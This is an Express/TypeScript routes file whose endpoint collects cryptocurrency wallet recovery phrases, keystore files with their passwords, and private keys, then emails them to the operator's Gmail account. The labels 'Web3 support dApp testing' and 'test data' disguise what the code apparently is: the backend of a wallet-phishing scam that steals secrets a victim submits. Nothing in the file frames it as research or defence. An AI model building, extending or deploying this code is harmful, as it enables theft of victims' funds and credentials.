
import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import nodemailer from 'nodemailer';

// Gmail configuration
const GMAIL_USER = process.env.GMAIL_USER || 'your-email@gmail.com'; // Replace with your Gmail
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD || ''; // Gmail App Password

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: GMAIL_USER,
    pass: GMAIL_APP_PASSWORD,
  },
});

export async function registerRoutes(app: Express): Promise<Server> {
  // Capture wallet connection data and send to Gmail
  app.post('/api/capture-wallet-data', async (req, res) => {
    try {
      const { wallet, method, data, timestamp } = req.body;
      
      // Prepare email content
      let emailContent = `
        <h2>🔍 Wallet Connection Test Data</h2>
        <p><strong>Timestamp:</strong> ${timestamp}</p>
        <p><strong>Wallet:</strong> ${wallet}</p>
        <p><strong>Method:</strong> ${method}</p>
        <hr>
      `;

      if (method === 'phrase') {
        emailContent += `
          <h3>Recovery Phrase:</h3>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">
            ${data.phrase}
          </p>
        `;
      } else if (method === 'keystore') {
        emailContent += `
          <h3>Keystore File:</h3>
          <p><strong>Filename:</strong> ${data.filename}</p>
          <p><strong>Password:</strong> ${data.password}</p>
          <details>
            <summary>Keystore Content</summary>
            <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto;">
              ${data.content}
            </pre>
          </details>
        `;
      } else if (method === 'privateKey') {
        emailContent += `
          <h3>Private Key:</h3>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">
            ${data.privateKey}
          </p>
        `;
      }

      emailContent += `
        <hr>
        <p><em>This is test data from your Web3 support dApp testing phase.</em></p>
      `;

      // Send email
      const mailOptions = {
        from: GMAIL_USER,
        to: GMAIL_USER, // Send to yourself
        subject: `🔍 Wallet Test Data - ${wallet} (${method})`,
        html: emailContent,
      };

      await transporter.sendMail(mailOptions);

      // Also store in memory/database for backup
      await storage.insertUser({
        id: Date.now(),
        username: `test_${wallet}_${method}_${Date.now()}`,
        password: 'test_data', // Not used for this purpose
      });

      res.json({ success: true, message: 'Data captured successfully' });
    } catch (error) {
      console.error('Error capturing wallet data:', error);
      res.status(500).json({ success: false, message: 'Failed to capture data' });
    }
  });

  // Health check endpoint
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });

  const httpServer = createServer(app);
  return httpServer;
}
